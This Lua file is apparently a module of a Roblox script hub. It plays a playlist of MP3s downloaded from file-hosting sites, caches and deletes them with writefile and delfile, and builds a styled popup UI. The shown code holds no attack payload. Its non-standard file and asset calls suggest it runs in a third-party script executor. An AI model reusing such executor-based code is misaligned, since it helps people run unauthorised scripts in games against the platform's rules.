-- MUSIC PLAYER (stessa logica dell'intro: download -> cache -> getcustomasset)
-- ============================================================
_VarynImportedMusicOptions = _VarynImportedMusicOptions or {
  {name="Nuts", url="https://files.catbox.moe/3153b5.mp3", file="AmbitiousHubMusic52.mp3"},
  {name="Gelato", url="https://files.catbox.moe/sospih.mp3", file="AmbitiousHubMusic1.mp3"},
  {name="Meant To Be", url="https://files.catbox.moe/smt6l8.mp3", file="AmbitiousHubMusic2.mp3"},
  {name="Beccaria San Vittore RMX", url="https://files.catbox.moe/2r8auq.mp3", file="AmbitiousHubMusic3.mp3"},
  {name="The Box", url="https://files.catbox.moe/yumqjl.mp3", file="AmbitiousHubMusic4.mp3"},
  {name="Mu Ammar Gheddafi RMX", url="https://files.catbox.moe/qcuden.mp3", file="AmbitiousHubMusic5.mp3"},
  {name="Marocchino RMX", url="https://files.catbox.moe/iyav31.mp3", file="AmbitiousHubMusic6.mp3"},
  {name="Gotham Mashup", url="https://files.catbox.moe/7eof36.mp3", file="AmbitiousHubMusic7.mp3"},
  {name="Goosebumps", url="https://files.catbox.moe/6wqcck.mp3", file="AmbitiousHubMusic8.mp3"},
  {name="Houdini", url="https://files.catbox.moe/gsuxur.mp3", file="AmbitiousHubMusic9.mp3"},
  {name="Magnolia", url="https://files.catbox.moe/ursllw.mp3", file="AmbitiousHubMusic10.mp3"},
  {name="Redemption RMX", url="https://files.catbox.moe/kjxkv7.mp3", file="AmbitiousHubMusic11.mp3"},
  {name="Evicted RMX", url="https://files.catbox.moe/s28bh5.mp3", file="AmbitiousHubMusic12.mp3"},
  {name="Lyfe RMX", url="https://files.catbox.moe/8hciqx.mp3", file="AmbitiousHubMusic13.mp3"},
  {name="No Refunds RMX", url="https://files.catbox.moe/uz9hot.mp3", file="AmbitiousHubMusic14.mp3"},
  {name="8 AM In Manny RMX", url="https://files.catbox.moe/xh4t0r.mp3", file="AmbitiousHubMusic15.mp3"},
  {name="Us Vs Them RMX", url="https://files.catbox.moe/po5fbj.mp3", file="AmbitiousHubMusic16.mp3"},
  {name="Reflection 2 RMX", url="https://files.catbox.moe/kcst57.mp3", file="AmbitiousHubMusic17.mp3"},
  {name="I Know You Care RMX", url="https://files.catbox.moe/c2en1v.mp3", file="AmbitiousHubMusic18.mp3"},
  {name="Bubblegum RMX", url="https://files.catbox.moe/8xf15k.mp3", file="AmbitiousHubMusic19.mp3"},
  {name="Cream RMX", url="https://files.catbox.moe/yfhgqz.mp3", file="AmbitiousHubMusic20.mp3"},
  {name="Panzerknacker.wav", url="https://files.catbox.moe/izcvhm.mp3", file="AmbitiousHubMusic21.mp3"},
  {name="Freaked Out", url="https://files.catbox.moe/dyt2ja.mp3", file="AmbitiousHubMusic22.mp3"},
  {name="Scam Likely", url="https://files.catbox.moe/pr85mz.mp3", file="AmbitiousHubMusic23.mp3"},
  {name="Pure Cocaine", url="https://files.catbox.moe/dvjtjk.mp3", file="AmbitiousHubMusic24.mp3"},
  {name="Tesla", url="https://files.catbox.moe/n85fch.mp3", file="AmbitiousHubMusic25.mp3"},
  {name="Piazza Di Spaccio 2 RMX", url="https://files.catbox.moe/0ompvn.mp3", file="AmbitiousHubMusic26.mp3"},
  {name="Benef RMX", url="https://files.catbox.moe/swcqe5.mp3", file="AmbitiousHubMusic27.mp3"},
  {name="Accavallato RMX", url="https://files.catbox.moe/pme01q.mp3", file="AmbitiousHubMusic28.mp3"},
  {name="Hd RMX", url="https://files.catbox.moe/oa3ylr.mp3", file="AmbitiousHubMusic29.mp3"},
  {name="Vyzee", url="https://files.catbox.moe/gmxz02.mp3", file="AmbitiousHubMusic30.mp3"},
  {name="Addiction", url="https://files.catbox.moe/unkq06.mp3", file="AmbitiousHubMusic31.mp3"},
  {name="America RMX", url="https://files.catbox.moe/k09ioc.mp3", file="AmbitiousHubMusic32.mp3"},
  {name="Sprinter", url="https://files.catbox.moe/0gyb73.mp3", file="AmbitiousHubMusic33.mp3"},
  {name="Band4Band", url="https://files.catbox.moe/47dehm.mp3", file="AmbitiousHubMusic34.mp3"},
  {name="Doja RMX", url="https://files.catbox.moe/8ze5d8.mp3", file="AmbitiousHubMusic35.mp3"},
  {name="Opinel RMX", url="https://files.catbox.moe/hf6pdq.mp3", file="AmbitiousHubMusic36.mp3"},
  {name="Vrp RMX", url="https://files.catbox.moe/hjzkbu.mp3", file="AmbitiousHubMusic37.mp3"},
  {name="Tarantelle RMX", url="https://files.catbox.moe/0e9jwg.mp3", file="AmbitiousHubMusic38.mp3"},
  {name="Hood RMX", url="https://files.catbox.moe/raewna.mp3", file="AmbitiousHubMusic39.mp3"},
  {name="Mask RMX", url="https://files.catbox.moe/ghqz2q.mp3", file="AmbitiousHubMusic40.mp3"},
  {name="Spinnin RMX", url="https://files.catbox.moe/r9achz.mp3", file="AmbitiousHubMusic41.mp3"},
  {name="Dnd RMX", url="https://files.catbox.moe/1d83ju.mp3", file="AmbitiousHubMusic42.mp3"},
  {name="Xnx RMX", url="https://files.catbox.moe/a2e54o.mp3", file="AmbitiousHubMusic43.mp3"},
  {name="Hypebae RMX", url="https://files.catbox.moe/oj6hix.mp3", file="AmbitiousHubMusic44.mp3"},
  {name="Mercedes Nero RMX", url="https://h.uguu.se/dCgHArHt.mp3", file="AmbitiousHubMusic45.mp3", rev=2},
  {name="Dissenatori RMX", url="https://files.catbox.moe/fbjq0w.mp3", file="AmbitiousHubMusic46.mp3"},
  {name="British RMX", url="https://files.catbox.moe/jn9mmr.mp3", file="AmbitiousHubMusic47.mp3"},
  {name="Go Go Jack RMX", url="https://files.catbox.moe/u31krk.mp3", file="AmbitiousHubMusic48.mp3"},
  {name="Darkmoney RMX", url="https://files.catbox.moe/rz4mzu.mp3", file="AmbitiousHubMusic49.mp3"},
  {name="Ghetto RMX", url="https://files.catbox.moe/omj56p.mp3", file="AmbitiousHubMusic50.mp3"},
  {name="Copacabana RMX", url="https://files.catbox.moe/g43412.mp3", file="AmbitiousHubMusic51.mp3"},
}

selectedMusicSong = selectedMusicSong or 1
musicPlayerVolume = musicPlayerVolume or 1
-- Velocita' di riproduzione: 1 = normale, passo 0.1, da 0.1 a 2.
musicPlayerSpeed = musicPlayerSpeed or 1
musicAutoPlayNext = musicAutoPlayNext == true
musicShuffleEnabled = musicShuffleEnabled == true
musicLoopEnabled = musicLoopEnabled == true
_musicPlayerSound = nil
_musicPlayerToken = 0
musicSongCache = musicSongCache or {}
musicSongDownloading = musicSongDownloading or {}
-- Revisioni gia' ripulite in questa esecuzione, per non ricontrollare
-- il disco a ogni canzone caricata.
musicRevCleaned = musicRevCleaned or {}
_G.AmbitiousMusicRefreshUI = nil
_G.AmbitiousMusicCloseUI = nil

function _VarynImportedMusicGetSongName()
  local opt = _VarynImportedMusicOptions[selectedMusicSong]
  return opt and opt.name or "No Song"
end

-- Indice casuale garantito diverso da quello corrente
function _VarynImportedMusicRandomIndex()
  local total = #_VarynImportedMusicOptions
  if total <= 1 then return 1 end
  local r = math.random(1, total - 1)
  if r >= selectedMusicSong then r = r + 1 end
  return r
end

function _VarynImportedMusicRefreshUI()
  if _G.AmbitiousMusicRefreshUI then pcall(_G.AmbitiousMusicRefreshUI) end
end

function _VarynImportedMusicCacheSong(option, allowDownload)
  if not option or not option.url or option.url == "" then return nil end
  if type(writefile) ~= "function" or type(getCustomAsset) ~= "function" then return nil end
  local baseName = option.file or ("AmbitiousHubMusic_" .. tostring(option.name or "song") .. ".mp3")
  -- REVISIONE DEL FILE.
  -- Se cambia il link di una canzone, chi ha gia' scaricato la vecchia se
  -- la ritrova in cache per sempre: il nome del file e' lo stesso e non c'e'
  -- modo di accorgersi che il contenuto non e' piu' quello giusto.
  -- Invece di storpiare il nome (o di scrivere una cancellazione una-tantum
  -- per quella singola canzone, che resterebbe li' come codice morto), la
  -- voce porta un campo "rev": alzarlo di 1 basta e avanza.
  --   rev assente o 1 -> AmbitiousHubMusic45.mp3
  --   rev = 2         -> AmbitiousHubMusic45_r2.mp3
  -- La prima volta che si tocca una canzone con rev > 1 si cancellano dal
  -- disco tutte le revisioni precedenti, quindi non si accumula niente.
  -- E' generico: la prossima volta che cambi un link non serve altro codice.
  local rev = math.max(math.floor(tonumber(option.rev) or 1), 1)
  local stem = baseName:gsub("%.mp3$", "")
  local fileName = (rev > 1) and (stem .. "_r" .. rev .. ".mp3") or baseName

  if rev > 1 and not musicRevCleaned[baseName] then
    musicRevCleaned[baseName] = true
    for r = 1, rev - 1 do
      local oldName = (r > 1) and (stem .. "_r" .. r .. ".mp3") or baseName
      musicSongCache[oldName] = nil
      pcall(function()
        if isfile and isfile(oldName) and delfile then delfile(oldName) end
      end)
    end
  end
  local function loadExisting()
    if musicSongCache[fileName] then return musicSongCache[fileName] end
    local hasFile = false
    pcall(function() hasFile = isfile and isfile(fileName) end)
    if hasFile then
      local ok = pcall(function() musicSongCache[fileName] = getCustomAsset(fileName) end)
      if ok and musicSongCache[fileName] then return musicSongCache[fileName] end
    end
    return nil
  end
  local cached = loadExisting()
  if cached then return cached end
  if allowDownload == false then return nil end
  if musicSongDownloading[fileName] then
    local waitStart = tick()
    while musicSongDownloading[fileName] and tick() - waitStart < 15 do task.wait(0.05) end
    cached = loadExisting()
    if cached then return cached end
  end
  musicSongDownloading[fileName] = true
  local ok = pcall(function()
    local data = fetchExternal(option.url)
    if data and #data > 0 then
      writefile(fileName, data)
      musicSongCache[fileName] = getCustomAsset(fileName)
    end
  end)
  musicSongDownloading[fileName] = nil
  if ok and musicSongCache[fileName] then return musicSongCache[fileName] end
  return loadExisting()
end

function _VarynImportedMusicCreateSound(option, name)
  if not option then return nil end
  local soundId = _VarynImportedMusicCacheSong(option, true)
  if not soundId then return nil end
  local sound = Instance.new("Sound")
  sound.Name = name or "SoundMusicPlayer"
  sound.Volume = musicPlayerVolume
  sound.PlaybackSpeed = musicPlayerSpeed
  sound.Looped = false
  sound.SoundId = soundId
  sound.Parent = VARYN_SoundService
  return sound
end

-- Fade away identico a quello dell'intro
function _VarynImportedMusicFadeOut(sound, dur)
  if not sound then return end
  dur = dur or 1.5
  pcall(function()
    VARYN_TweenService:Create(sound, TweenInfo.new(dur, Enum.EasingStyle.Linear), {Volume = 0}):Play()
  end)
  task.delay(dur + 0.1, function()
    pcall(function()
      if sound and sound.Parent then
        sound:Stop()
        sound:Destroy()
      end
    end)
  end)
end

function _VarynImportedMusicStop(fade)
  _musicPlayerToken = _musicPlayerToken + 1
  local sound = _musicPlayerSound
  _musicPlayerSound = nil
  if sound then
    if fade == false then
      pcall(function() sound:Stop(); sound:Destroy() end)
    else
      _VarynImportedMusicFadeOut(sound, 1.5)
    end
  end
  _VarynImportedMusicRefreshUI()
end

function _VarynImportedMusicPlay(index)
  index = tonumber(index) or selectedMusicSong
  local total = #_VarynImportedMusicOptions
  if total <= 0 then return end
  if index < 1 then index = total end
  if index > total then index = 1 end
  if not _VarynImportedMusicOptions[index] then return end
  selectedMusicSong = index
  _VarynImportedMusicStop(true)
  local token = _musicPlayerToken
  _VarynImportedMusicRefreshUI()
  task.spawn(function()
    local option = _VarynImportedMusicOptions[index]
    local sound = _VarynImportedMusicCreateSound(option, "SoundMusicPlayer_" .. tostring(token))
    if token ~= _musicPlayerToken then
      if sound then pcall(function() sound:Destroy() end) end
      return
    end
    if not sound then _VarynMusicNotify("SONG FAILED"); return end
    sound.Volume = musicPlayerVolume
    sound.PlaybackSpeed = musicPlayerSpeed
    sound.TimePosition = 0
    _musicPlayerSound = sound
    local loadStart = tick()
    while sound and sound.Parent and not sound.IsLoaded and tick() - loadStart < 15 do task.wait(0.05) end
    if token ~= _musicPlayerToken then
      pcall(function() if sound and sound.Parent then sound:Destroy() end end)
      return
    end
    pcall(function() sound:Play() end)
    _VarynImportedMusicRefreshUI()

    local endedConn
    endedConn = sound.Ended:Connect(function()
      if endedConn then pcall(function() endedConn:Disconnect() end) end
      if token ~= _musicPlayerToken then return end
      if musicLoopEnabled then
        _VarynImportedMusicPlay(selectedMusicSong)
      elseif musicShuffleEnabled then
        _VarynImportedMusicPlay(_VarynImportedMusicRandomIndex())
      elseif musicAutoPlayNext then
        _VarynImportedMusicPlay(selectedMusicSong + 1)
      else
        _VarynImportedMusicStop(false)
      end
    end)

    -- Fade away sul finale della traccia (come l'intro)
    task.spawn(function()
      while token == _musicPlayerToken and sound and sound.Parent do
        local len = sound.TimeLength
        if len and len > 1 then
          local remaining = len - sound.TimePosition
          if remaining <= 1.6 and sound.IsPlaying and sound:GetAttribute("_amFaded") ~= true then
            sound:SetAttribute("_amFaded", true)
            local d = math.clamp(remaining - 0.05, 0.2, 1.5)
            pcall(function()
              VARYN_TweenService:Create(sound, TweenInfo.new(d, Enum.EasingStyle.Linear), {Volume = 0}):Play()
            end)
          end
        end
        task.wait(0.1)
      end
    end)
  end)
end

function _VarynImportedMusicPauseToggle()
  local sound = _musicPlayerSound
  if not sound or not sound.Parent then
    _VarynImportedMusicPlay(selectedMusicSong)
    return
  end
  if sound.IsPlaying then
    pcall(function() sound:Pause() end)
  else
    pcall(function() sound:Resume() end)
  end
  _VarynImportedMusicRefreshUI()
end

function _VarynImportedMusicNext()
  if musicShuffleEnabled then
    _VarynImportedMusicPlay(_VarynImportedMusicRandomIndex())
  else
    _VarynImportedMusicPlay(selectedMusicSong + 1)
  end
  F.saveConfig()
end

function _VarynImportedMusicPrev()
  if musicShuffleEnabled then
    _VarynImportedMusicPlay(_VarynImportedMusicRandomIndex())
  else
    _VarynImportedMusicPlay(selectedMusicSong - 1)
  end
  F.saveConfig()
end

function _VarynImportedMusicSeek(delta)
  local sound = _musicPlayerSound
  if not sound or not sound.Parent then return end
  local len = sound.TimeLength or 0
  -- Il delta arriva in secondi "di ascolto": va convertito in secondi di
  -- traccia, altrimenti a 2x un salto di 10s ne farebbe 10 sul display ma
  -- 10 sulla traccia, cioe' 5 percepiti.
  local sp = tonumber(musicPlayerSpeed) or 1
  if sp <= 0 then sp = 1 end
  local newPos = sound.TimePosition + ((tonumber(delta) or 0) * sp)
  if newPos < 0 then newPos = 0 end
  if len > 0 and newPos > (len - 0.2) then newPos = math.max(len - 0.2, 0) end
  pcall(function() sound.TimePosition = newPos end)
  if len > 0 and (len - newPos) > 1.8 then
    pcall(function()
      sound:SetAttribute("_amFaded", false)
      sound.Volume = musicPlayerVolume
    end)
  end
  _VarynImportedMusicRefreshUI()
end

-- Velocita': stesso schema del volume. Si arrotonda al decimo cosi' i
-- click di < e > non accumulano errore in virgola mobile (0.1 + 0.2 ...).
function _VarynImportedMusicSetSpeed(v)
  v = math.clamp(math.floor((tonumber(v) or 1) * 10 + 0.5) / 10, 0.1, 2)
  musicPlayerSpeed = v
  local sound = _musicPlayerSound
  if sound and sound.Parent then
    pcall(function() sound.PlaybackSpeed = v end)
  end
  if F.saveConfig then pcall(F.saveConfig) end
  _VarynImportedMusicRefreshUI()
end

function _VarynImportedMusicSetVolume(v)
  v = math.clamp(math.floor((tonumber(v) or 1) * 100 + 0.5) / 100, 0, 2)
  musicPlayerVolume = v
  local sound = _musicPlayerSound
  if sound and sound.Parent and sound:GetAttribute("_amFaded") ~= true then
    pcall(function() sound.Volume = v end)
  end
  if F.saveConfig then pcall(F.saveConfig) end
  _VarynImportedMusicRefreshUI()
end

  -- Safe wrappers for source popup helper calls.
  -- The source UI assumes the helper exists in the same lexical scope.
  local mpGui = nil

  function _VarynImportedMusicClose()
    _G.AmbitiousMusicRefreshUI = nil
    if mpGui and mpGui.Parent then
      local fr = mpGui:FindFirstChild("Frame")
      if fr then
        pcall(function()
          VARYN_TweenService:Create(fr, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        end)
      end
      local g = mpGui
      mpGui = nil
      task.delay(0.25, function()
        pcall(function() if g and g.Parent then g:Destroy() end end)
      end)
    else
      mpGui = nil
    end
    if _G.SoundMusicToggleVisual then
      pcall(_G.SoundMusicToggleVisual, false)
    end
  end
  _G.AmbitiousMusicCloseUI = _VarynImportedMusicClose

  local function _mpFmtTime(t)
    t = math.max(0, math.floor(tonumber(t) or 0))
    return string.format("%d:%02d", math.floor(t / 60), t % 60)
  end

  local function _mpSmallBtn(parent, name, text, size, pos, textSize)
    local b = Instance.new("TextButton")
    b.Name = name
    b.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
    b.BackgroundTransparency = 0.05
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.TextSize = textSize or 13
    b.Font = Enum.Font.GothamBlack
    b.TextXAlignment = Enum.TextXAlignment.Center
    b.TextYAlignment = Enum.TextYAlignment.Center
    b.AutoButtonColor = false
    b.Size = size
    b.Position = pos
    b.ZIndex = 6
    b.Parent = parent
    corner(b, 10)
    stroke(b, Color3.fromRGB(82, 82, 82), 1, 0.5)
    b.MouseEnter:Connect(function()
      VARYN_tween(b, {BackgroundColor3 = Color3.fromRGB(28, 28, 28)}, 0.1)
    end)
    b.MouseLeave:Connect(function()
      VARYN_tween(b, {BackgroundColor3 = Color3.fromRGB(7, 7, 7)}, 0.1)
    end)
    return b
  end

  local function _mpToggleRow(parent, labelText, getVal, setVal, yPos)
    local f = Instance.new("Frame")
    f.Name = labelText
    f.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    f.BackgroundTransparency = 0.1
    f.BorderSizePixel = 0
    f.Size = UDim2.new(1, -24, 0, 36)
    f.Position = UDim2.new(0, 12, 0, yPos)
    f.ZIndex = 4
    f.Parent = parent
    corner(f, 9)
    stroke(f, Color3.fromRGB(82, 82, 82), 1, 0.45)

    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Text = labelText
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    lbl.TextStrokeTransparency = 0.35
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.Size = UDim2.new(1, -92, 1, 0)
    lbl.ZIndex = 5
    lbl.Parent = f

    local pillBg = Instance.new("Frame")
    pillBg.Name = "PillBg"
    pillBg.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
    pillBg.BackgroundTransparency = 0
    pillBg.BorderSizePixel = 0
    pillBg.Size = UDim2.new(0, 60, 0, 24)
    pillBg.Position = UDim2.new(1, -72, 0.5, -12)
    pillBg.ZIndex = 5
    pillBg.Parent = f
    corner(pillBg, 12)

    local pillBgStroke = Instance.new("UIStroke")
    pillBgStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    pillBgStroke.Color = Color3.fromRGB(82, 82, 82)
    pillBgStroke.Thickness = 1
    pillBgStroke.Transparency = 0.5
    pillBgStroke.Parent = pillBg

    local pillBgGrad = Instance.new("UIGradient")
    pillBgGrad.Color = ColorSequence.new({
      ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
      ColorSequenceKeypoint.new(0.5, Color3.fromRGB(245, 245, 245)),
      ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 120, 120)),
    })
    pillBgGrad.Rotation = 18
    pillBgGrad.Enabled = false
    pillBgGrad.Parent = pillBg
  
    local pill = Instance.new("TextButton")
    pill.Name = "Pill"
    pill.BackgroundTransparency = 1
    pill.BorderSizePixel = 0
    pill.Text = "OFF"
    pill.TextColor3 = Color3.fromRGB(175, 175, 175)
    pill.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    pill.TextStrokeTransparency = 0.35
    pill.TextSize = 11
    pill.Font = Enum.Font.GothamBlack
    pill.AutoButtonColor = false
    pill.Size = UDim2.new(0, 60, 0, 24)
    pill.Position = UDim2.new(1, -72, 0.5, -12)
    pill.ZIndex = 7
    pill.Parent = f
    corner(pill, 12)

    local function apply(v)
      local onBase = Color3.fromRGB(245, 245, 245)
      local onEdge = Color3.fromRGB(235, 235, 235)
      if v then
        pill.Text = "ON"
        pill.TextColor3 = Color3.fromRGB(255, 255, 255)
        pillBg.BackgroundColor3 = onBase
        pillBgGrad.Enabled = true
        pillBgStroke.Color = onEdge
        pillBgStroke.Transparency = 0.15
      else
        pill.Text = "OFF"
        pill.TextColor3 = Color3.fromRGB(175, 175, 175)
        pillBg.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
        pillBgGrad.Enabled = false
        pillBgStroke.Color = Color3.fromRGB(82, 82, 82)
        pillBgStroke.Transparency = 0.5
      end
    end

    apply(getVal() == true)
    pill.MouseButton1Click:Connect(function()
      local nv = not (getVal() == true)
      setVal(nv)
      apply(nv)
    end)

    pill.MouseEnter:Connect(function()
      VARYN_tween(pillBg, {Size = UDim2.new(0, 66, 0, 28), Position = UDim2.new(1, -75, 0.5, -14)}, 0.12)
      VARYN_tween(pill, {Size = UDim2.new(0, 66, 0, 28), Position = UDim2.new(1, -75, 0.5, -14)}, 0.12)
    end)
    pill.MouseLeave:Connect(function()
      VARYN_tween(pillBg, {Size = UDim2.new(0, 60, 0, 24), Position = UDim2.new(1, -72, 0.5, -12)}, 0.12)
      VARYN_tween(pill, {Size = UDim2.new(0, 60, 0, 24), Position = UDim2.new(1, -72, 0.5, -12)}, 0.12)
    end)

    return f, apply
  end

  -- Use the original source UI body, adapted to Varyn services/helpers.

function _VarynImportedMusicOpen()
  if mpGui and mpGui.Parent then return end

  mpGui = Instance.new("ScreenGui")
  mpGui.Name = "SoundMusicPlayer"
  mpGui.ResetOnSpawn = false
  mpGui.IgnoreGuiInset = true
  mpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  mpGui.DisplayOrder = 9999
  mpGui.Parent = getPopupParent()

  local backdrop = Instance.new("Frame")
  backdrop.Name = "Backdrop"
  backdrop.Size = UDim2.new(1, 0, 1, 0)
  backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
  backdrop.BackgroundTransparency = 0.46
  backdrop.BorderSizePixel = 0
  backdrop.ZIndex = 1
  backdrop.Parent = mpGui

  -- Pannello piu' arioso: header -> now playing -> progress -> controlli
  -- -> opzioni -> volume/speed -> playlist.
  local W, H = 392, 590
  local frame = Instance.new("Frame")
  frame.Name = "Frame"
  frame.Size = UDim2.new(0, W, 0, H)
  frame.AnchorPoint = Vector2.new(0.5, 0.5)
  frame.Position = UDim2.new(0.5, 0, 0.5, 0)
  frame.BackgroundColor3 = Color3.fromRGB(9, 9, 12)
  frame.BorderSizePixel = 0
  frame.ZIndex = 2
  frame.Parent = mpGui

  local mpScale = Instance.new("UIScale")
  mpScale.Name = "MusicPlayerScale"
  mpScale.Scale = 0.78
  mpScale.Parent = frame

  corner(frame, 20)
  stroke(frame, Color3.fromRGB(92, 92, 96), 1.2, 0.18)
  local mpGlow = Instance.new("UIStroke")
  mpGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  mpGlow.Color = Color3.fromRGB(225, 225, 235)
  mpGlow.Thickness = 7
  mpGlow.Transparency = 0.965
  mpGlow.Parent = frame
  VARYN_TweenService:Create(mpGlow, TweenInfo.new(1.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.90}):Play()

  local mpBgGrad = Instance.new("UIGradient")
  mpBgGrad.Name = "BackgroundGradient"
  mpBgGrad.Rotation = 115
  mpBgGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 24)),
    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(8, 8, 11)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 18)),
  })
  mpBgGrad.Parent = frame

  local innerStroke = Instance.new("UIStroke")
  innerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  innerStroke.Color = Color3.fromRGB(255, 255, 255)
  innerStroke.Thickness = 0.6
  innerStroke.Transparency = 0.9
  innerStroke.Parent = frame

  local topGlow = Instance.new("Frame")
  topGlow.Name = "TopGlow"
  topGlow.Size = UDim2.new(1, -24, 0, 4)
  topGlow.Position = UDim2.new(0, 12, 0, 48)
  topGlow.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
  topGlow.BorderSizePixel = 0
  topGlow.ZIndex = 4
  topGlow.Parent = frame
  corner(topGlow, 2)
  local topGrad = Instance.new("UIGradient")
  topGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 110, 110)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 110, 110)),
  })
  topGrad.Parent = topGlow

  local title = Instance.new("TextLabel")
  title.Name = "Title"
  title.BackgroundTransparency = 1
  title.Text = "MUSIC PLAYER"
  title.TextColor3 = Color3.fromRGB(255, 255, 255)
  title.Font = Enum.Font.GothamBlack
  title.TextSize = 14
  title.TextXAlignment = Enum.TextXAlignment.Left
  title.Size = UDim2.new(1, -72, 0, 42)
  title.Position = UDim2.new(0, 16, 0, 4)
  title.ZIndex = 4
  title.Parent = frame

  local subtitle = Instance.new("TextLabel")
  subtitle.Name = "Subtitle"
  subtitle.BackgroundTransparency = 1
  subtitle.Text = "NOW PLAYING"
  subtitle.TextColor3 = Color3.fromRGB(155, 155, 155)
  subtitle.Font = Enum.Font.GothamBold
  subtitle.TextSize = 9
  subtitle.TextXAlignment = Enum.TextXAlignment.Left
  subtitle.Size = UDim2.new(0, 110, 0, 14)
  subtitle.Position = UDim2.new(0, 17, 0, 34)
  subtitle.ZIndex = 4
  subtitle.Parent = frame

  local closeBtn = Instance.new("TextButton")
  closeBtn.Name = "CloseBtn"
  closeBtn.Size = UDim2.new(0, 34, 0, 34)
  closeBtn.Position = UDim2.new(1, -46, 0, 8)
  closeBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
  closeBtn.BorderSizePixel = 0
  closeBtn.Text = "X"
  closeBtn.TextColor3 = Color3.fromRGB(245, 245, 250)
  closeBtn.Font = Enum.Font.GothamBlack
  closeBtn.TextSize = 13
  closeBtn.AutoButtonColor = false
  closeBtn.ZIndex = 5
  closeBtn.Parent = frame
  corner(closeBtn, 10)
  stroke(closeBtn, Color3.fromRGB(88, 88, 88), 1, 0.4)
  closeBtn.MouseEnter:Connect(function() VARYN_tween(closeBtn, {BackgroundColor3 = Color3.fromRGB(54, 54, 54)}, 0.12) end)
  closeBtn.MouseLeave:Connect(function() VARYN_tween(closeBtn, {BackgroundColor3 = Color3.fromRGB(16, 16, 16)}, 0.12) end)
  closeBtn.Activated:Connect(_VarynImportedMusicClose)

  local nowCard = Instance.new("Frame")
  nowCard.Name = "NowPlaying"
  nowCard.Size = UDim2.new(1, -24, 0, 84)
  nowCard.Position = UDim2.new(0, 12, 0, 62)
  nowCard.BackgroundColor3 = Color3.fromRGB(13, 13, 16)
  nowCard.BorderSizePixel = 0
  nowCard.ZIndex = 3
  nowCard.Parent = frame
  corner(nowCard, 14)
  stroke(nowCard, Color3.fromRGB(72, 72, 72), 1, 0.4)
  local nowGlow = Instance.new("UIStroke")
  nowGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  nowGlow.Color = Color3.fromRGB(205, 205, 215)
  nowGlow.Thickness = 4
  nowGlow.Transparency = 0.965
  nowGlow.Parent = nowCard
  VARYN_TweenService:Create(nowGlow, TweenInfo.new(1.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.925}):Play()

  local disk = Instance.new("Frame")
  disk.Name = "Artwork"
  disk.Size = UDim2.new(0, 58, 0, 58)
  disk.Position = UDim2.new(0, 12, 0.5, -29)
  disk.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
  disk.BorderSizePixel = 0
  disk.ZIndex = 4
  disk.Parent = nowCard
  corner(disk, 16)
  local diskGrad = Instance.new("UIGradient")
  diskGrad.Rotation = 35
  diskGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(115, 115, 115)),
  })
  diskGrad.Parent = disk

  local diskText = Instance.new("TextLabel")
  diskText.BackgroundTransparency = 1
  diskText.Size = UDim2.new(1, 0, 1, 0)
  diskText.Text = utf8.char(9834)
  diskText.TextColor3 = Color3.fromRGB(255, 255, 255)
  diskText.TextSize = 25
  diskText.Font = Enum.Font.GothamBlack
  diskText.ZIndex = 5
  diskText.Parent = disk

  local nameLbl = Instance.new("TextLabel")
  nameLbl.Name = "SongName"
  nameLbl.BackgroundTransparency = 1
  nameLbl.Text = _VarynImportedMusicGetSongName()
  nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
  nameLbl.Font = Enum.Font.GothamBlack
  nameLbl.TextSize = 16
  nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
  nameLbl.TextXAlignment = Enum.TextXAlignment.Left
  nameLbl.Size = UDim2.new(1, -92, 0, 26)
  nameLbl.Position = UDim2.new(0, 84, 0, 16)
  nameLbl.ZIndex = 5
  nameLbl.Parent = nowCard

  local counterLbl = Instance.new("TextLabel")
  counterLbl.Name = "TrackCounter"
  counterLbl.BackgroundTransparency = 1
  counterLbl.Text = "TRACK 1 / " .. tostring(#_VarynImportedMusicOptions)
  counterLbl.TextColor3 = Color3.fromRGB(150, 150, 168)
  counterLbl.Font = Enum.Font.GothamBold
  counterLbl.TextSize = 9
  counterLbl.TextXAlignment = Enum.TextXAlignment.Left
  counterLbl.Size = UDim2.new(1, -92, 0, 14)
  counterLbl.Position = UDim2.new(0, 84, 0, 45)
  counterLbl.ZIndex = 5
  counterLbl.Parent = nowCard

  local barBg = Instance.new("Frame")
  barBg.Name = "ProgressBg"
  barBg.Size = UDim2.new(1, -30, 0, 7)
  barBg.Position = UDim2.new(0, 15, 0, 158)
